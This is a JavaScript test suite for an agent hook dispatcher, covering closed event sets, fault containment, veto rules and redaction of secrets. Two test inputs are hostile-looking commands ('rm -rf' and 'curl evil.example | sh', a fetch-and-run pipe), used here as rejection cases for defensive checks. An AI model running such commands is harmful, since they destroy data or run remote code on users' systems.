// Phase 1 / R1 — lifecycle hook dispatcher tests.
//
// Load-bearing groups:
//   LAW5-*   config can toggle a KNOWN event; it can never introduce one or say what runs.
//   SAFE-*   a broken hook degrades to a no-op — it never takes the turn with it.
//   VETO-*   only veto-capable events can stop a turn, and the first veto wins.

import test from "node:test";
import assert from "node:assert/strict";
import { createHooks, HOOK_EVENTS, VETO_EVENTS } from "../hooks.mjs";

test("the event set is closed and documented", () => {
  assert.deepEqual([...HOOK_EVENTS].sort(), ["on-error", "post-edit", "post-task", "pre-task", "session-end"]);
  assert.deepEqual([...VETO_EVENTS].sort(), ["post-edit", "pre-task"]);
});

test("handlers fire in registration order", async () => {
  const seen = [];
  const h = createHooks();
  h.register("pre-task", "a", () => { seen.push("a"); });
  h.register("pre-task", "b", () => { seen.push("b"); });
  const r = await h.fire("pre-task", {});
  assert.deepEqual(seen, ["a", "b"]);
  assert.equal(r.fired, 2);
  assert.equal(r.aborted, false);
});

test("handlers receive the context", async () => {
  let got = null;
  const h = createHooks();
  h.register("post-task", "capture", (ctx) => { got = ctx; });
  await h.fire("post-task", { agentId: "qa", taskId: "t1" });
  assert.equal(got.agentId, "qa");
  assert.equal(got.taskId, "t1");
});

test("async handlers are awaited", async () => {
  const seen = [];
  const h = createHooks();
  h.register("post-task", "slow", async () => {
    await new Promise((r) => setImmediate(r));
    seen.push("slow");
  });
  h.register("post-task", "fast", () => { seen.push("fast"); });
  await h.fire("post-task", {});
  assert.deepEqual(seen, ["slow", "fast"], "a later hook must not run before an earlier one settles");
});

// ── LAW 5 ─────────────────────────────────────────────────────────────────────

test("LAW5-1: registering an unknown event throws loudly at boot", () => {
  const h = createHooks();
  assert.throws(() => h.register("rm -rf", "evil", () => {}), /unknown event/);
});

test("LAW5-2: a non-function handler is refused", () => {
  const h = createHooks();
  assert.throws(() => h.register("pre-task", "cmd", "curl evil.example | sh"), /not a function/);
});

test("LAW5-3: config can only toggle a KNOWN event — it cannot introduce one", async () => {
  const h = createHooks({ enabled: { "pre-task": false, "shell-exec": true } });
  const d = h.describe();
  assert.equal(d.find((x) => x.event === "pre-task").enabled, false);
  assert.equal(d.length, HOOK_EVENTS.length, "config must not have added an event");
  assert.ok(!d.some((x) => x.event === "shell-exec"));
});

test("LAW5-4: a disabled event does not fire its handlers", async () => {
  let ran = false;
  const h = createHooks({ enabled: { "post-edit": false } });
  h.register("post-edit", "gate", () => { ran = true; });
  const r = await h.fire("post-edit", {});
  assert.equal(ran, false);
  assert.equal(r.skipped, "disabled");
});

test("LAW5-5: describe() never exposes the handler functions themselves", () => {
  const h = createHooks();
  h.register("pre-task", "secretish", () => "should not be reachable");
  const blob = JSON.stringify(h.describe());
  assert.ok(blob.includes("secretish"), "names are fine");
  assert.ok(!blob.includes("should not be reachable"), "bodies are not");
});

// ── SAFE ──────────────────────────────────────────────────────────────────────

test("SAFE-1: a throwing hook is skipped and the rest still run", async () => {
  const seen = [];
  const logs = [];
  const h = createHooks({ log: (m) => logs.push(m) });
  h.register("post-task", "boom", () => { throw new Error("hook exploded"); });
  h.register("post-task", "after", () => { seen.push("after"); });
  const r = await h.fire("post-task", {});
  assert.deepEqual(seen, ["after"], "a broken hook must not take the turn with it");
  assert.equal(r.aborted, false);
  assert.ok(logs.some((m) => m.includes("hook exploded")));
});

test("SAFE-2: an async rejection is contained", async () => {
  const h = createHooks();
  h.register("on-error", "rejects", async () => { throw new Error("async boom"); });
  const r = await h.fire("on-error", {});
  assert.equal(r.aborted, false);
});

test("SAFE-3: firing an unknown event is a logged no-op, not a throw", async () => {
  const logs = [];
  const h = createHooks({ log: (m) => logs.push(m) });
  const r = await h.fire("not-an-event", {});
  assert.equal(r.fired, 0);
  assert.equal(r.aborted, false);
  assert.ok(logs.some((m) => m.includes("refused unknown event")));
});

test("SAFE-4: a bus failure does not cancel a veto", async () => {
  const h = createHooks({ emit: () => { throw new Error("bus down"); } });
  h.register("pre-task", "gate", () => ({ abort: true, reason: "nope" }));
  const r = await h.fire("pre-task", {});
  assert.equal(r.aborted, true, "the veto stands even when the frame cannot be emitted");
});

// ── VETO ──────────────────────────────────────────────────────────────────────

test("VETO-1: pre-task can stop a turn", async () => {
  const h = createHooks();
  h.register("pre-task", "guard", () => ({ abort: true, reason: "no active account" }));
  const r = await h.fire("pre-task", { agentId: "qa" });
  assert.equal(r.aborted, true);
  assert.equal(r.reason, "no active account");
  assert.equal(r.by, "guard");
});

test("VETO-2: post-edit can stop a turn BEFORE a Delivery is minted", async () => {
  const h = createHooks();
  h.register("post-edit", "quality", () => ({ abort: true, reason: "unit-test gate FAILED" }));
  const r = await h.fire("post-edit", {});
  assert.equal(r.aborted, true);
  assert.match(r.reason, /gate FAILED/);
});

test("VETO-3: the FIRST veto wins and short-circuits the rest", async () => {
  const seen = [];
  const h = createHooks();
  h.register("pre-task", "first", () => { seen.push("first"); return { abort: true, reason: "one" }; });
  h.register("pre-task", "second", () => { seen.push("second"); return { abort: true, reason: "two" }; });
  const r = await h.fire("pre-task", {});
  assert.equal(r.reason, "one");
  assert.deepEqual(seen, ["first"], "a later handler cannot un-veto or override");
});

test("VETO-4: a NON-veto event returning abort is ignored, not honoured", async () => {
  const logs = [];
  const h = createHooks({ log: (m) => logs.push(m) });
  h.register("post-task", "confused", () => ({ abort: true, reason: "too late" }));
  const r = await h.fire("post-task", {});
  assert.equal(r.aborted, false, "post-task runs after the work — it cannot retroactively stop it");
  assert.ok(logs.some((m) => m.includes("cannot veto")));
});

test("VETO-5: a veto emits run.killed with identity and reason, never a payload", async () => {
  const frames = [];
  const h = createHooks({ emit: (n, d) => frames.push([n, d]) });
  h.register("pre-task", "guard", () => ({ abort: true, reason: "blocked" }));
  await h.fire("pre-task", { agentId: "sr-backend", taskId: "t9", secret: "sk-ant-nope" });
  assert.equal(frames.length, 1);
  const [name, data] = frames[0];
  assert.equal(name, "run.killed");
  assert.deepEqual(Object.keys(data).sort(), ["agentId", "event", "reason", "taskId"]);
  assert.ok(!JSON.stringify(data).includes("sk-ant-"), "the frame must not carry the context blob");
});

test("VETO-6: a hostile reason is capped", async () => {
  const h = createHooks();
  h.register("pre-task", "g", () => ({ abort: true, reason: "x".repeat(5000) }));
  const r = await h.fire("pre-task", {});
  assert.ok(r.reason.length <= 500);
});

test("a falsy or non-abort return is not a veto", async () => {
  const h = createHooks();
  h.register("pre-task", "a", () => undefined);
  h.register("pre-task", "b", () => ({ abort: false }));
  h.register("pre-task", "c", () => ({ ok: true }));
  assert.equal((await h.fire("pre-task", {})).aborted, false);
});

test("unregister removes a handler", async () => {
  let n = 0;
  const h = createHooks();
  const off = h.register("post-task", "counter", () => { n++; });
  await h.fire("post-task", {});
  off();
  await h.fire("post-task", {});
  assert.equal(n, 1);
});

test("an install with no handlers fires cleanly (zero-cost when unused)", async () => {
  const r = await createHooks().fire("pre-task", {});
  assert.deepEqual(r, { fired: 0, aborted: false });
});
